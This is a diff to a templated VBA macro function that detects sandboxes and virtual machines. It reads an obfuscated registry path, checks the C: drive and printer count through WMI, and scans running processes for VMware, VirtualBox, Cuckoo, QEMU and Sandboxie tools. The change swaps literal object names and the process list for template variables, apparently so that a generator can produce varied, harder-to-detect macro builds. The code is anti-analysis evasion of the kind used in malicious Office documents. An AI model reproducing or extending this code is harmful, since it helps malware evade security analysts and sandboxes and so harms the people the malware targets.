@@ -127,7 +127,7 @@ Private Function {{ v.fn_sandbox }}() As Boolean
     vmCodes(45)=108:vmCodes(46)=108:vmCodes(47)=80:vmCodes(48)=97:vmCodes(49)=116
     vmCodes(50)=104
     Dim wshShell As Object
-    Set wshShell = CreateObject("WScript.Shell")
+    Set wshShell = CreateObject({{ v.vba_wscript_shell }})
     wshShell.RegRead {{ v.fn_build_str }}(vmCodes)
     If Err.Number = 0 Then {{ v.fn_sandbox }} = True: Set wshShell = Nothing: Exit Function
     Err.Clear
@@ -148,7 +148,7 @@ Private Function {{ v.fn_sandbox }}() As Boolean
     Err.Clear
     Set wshShell = Nothing
     Dim fso2 As Object
-    Set fso2 = CreateObject("Scripting.FileSystemObject")
+    Set fso2 = CreateObject({{ v.vba_fs_obj }})
     On Error Resume Next
     Dim drv2 As Object
     Set drv2 = fso2.GetDrive("C:")
@@ -159,7 +159,7 @@ Private Function {{ v.fn_sandbox }}() As Boolean
     Set fso2 = Nothing
     Dim wmiSvc3 As Object
     On Error Resume Next
-    Set wmiSvc3 = GetObject("winmgmts:")
+    Set wmiSvc3 = GetObject({{ v.vba_winmgmts }})
     If Err.Number = 0 Then
         Dim prtQ As Object: Set prtQ = wmiSvc3.ExecQuery("SELECT Name FROM Win32_Printer")
         Dim prtCnt As Long: prtCnt = 0
@@ -171,10 +171,10 @@ Private Function {{ v.fn_sandbox }}() As Boolean
     Set wmiSvc3 = Nothing
     Dim wmiProc As Object
     On Error Resume Next
-    Set wmiProc = GetObject("winmgmts:")
+    Set wmiProc = GetObject({{ v.vba_winmgmts }})
     If Err.Number = 0 Then
         Dim pQ As Object: Set pQ = wmiProc.ExecQuery("SELECT Name FROM Win32_Process")
-        Dim badProc: badProc = Array("vmtoolsd.exe","vboxservice.exe","cuckoo.exe","vmsrvc.exe","qemu-ga.exe","prl_tools.exe","xenservice.exe","sandboxiedcomlaunch.exe","vmusrvc.exe")
+        Dim badProc() As String: badProc = Split({{ v.vba_vm_procs }}, "|")
         Dim oP As Object, pn As String, j As Integer
         For Each oP In pQ
             pn = LCase(oP.Name)
